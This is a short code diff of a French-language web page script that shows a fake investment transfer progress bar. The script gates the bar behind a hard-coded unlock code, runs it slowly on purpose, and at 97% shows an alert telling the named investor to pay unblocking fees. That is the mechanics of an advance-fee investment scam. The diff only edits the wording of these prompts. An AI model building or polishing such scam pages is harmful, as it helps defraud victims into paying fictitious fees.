@@ -147,7 +147,7 @@
             <div class="transfer-text">Montant total à recevoir : ${totalAmount}</div>
         `;
         document.querySelector('#btn-deblock').addEventListener('click', () => {
-            let code2 = prompt("Veuillez entrer le code pour débloquer")
+            let code2 = prompt("Veillez entrer le code d'investissement")
             if(code2 == "2120"){
                 interval = setInterval(progress, 8500); // Change speed here
             }else{
@@ -172,7 +172,7 @@
             }
 
             if (percent == 97) {
-                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme '+ investorName +' veuillez payer les frais de deblocage de votre investissement';
+                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme '+ investorName +' veillez payer les frais de deblocage de votre investissement';
             }
         }
 
